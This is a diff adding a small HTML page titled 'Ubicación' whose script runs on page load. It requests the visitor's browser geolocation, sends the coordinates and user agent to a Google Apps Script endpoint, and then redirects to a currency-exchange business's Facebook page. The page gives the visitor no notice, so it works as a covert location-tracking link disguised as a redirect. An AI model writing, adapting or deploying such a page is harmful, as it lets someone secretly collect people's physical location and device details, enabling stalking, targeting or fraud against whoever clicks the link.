@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Ubicación</title>
+</head>
+<body>
+
+<script>
+
+    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycby8V3AUsqMVl0NBlbP6KEVRZsJyilyAYQNJlcI849T9Yt3u-dxxZq6qV4Hn7S3c16jf/exec"
+
+function enviarUbicacion(lat, lng) {
+
+  const formData = new URLSearchParams();
+  formData.append("latitud", lat);
+  formData.append("longitud", lng);
+  formData.append("userAgent", navigator.userAgent);
+
+  fetch(WEBAPP_URL, {
+    method: "POST",
+    body: formData
+  })
+  .then(() => {
+      window.location.href = "https://www.facebook.com/orderexpresscasadecambio/?locale=es_LA";
+  })
+  .catch(() => {
+      window.location.href = "https://www.facebook.com/orderexpresscasadecambio/?locale=es_LA";
+  });
+}
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      enviarUbicacion(
+        position.coords.latitude,
+        position.coords.longitude
+      );
+    },
+    error => {
+      enviarUbicacion("No permitido", "No permitido");
+    }
+  );
+} else {
+  enviarUbicacion("No soportado", "No soportado");
+}
+
+</script>
+
+</body>
+</html>
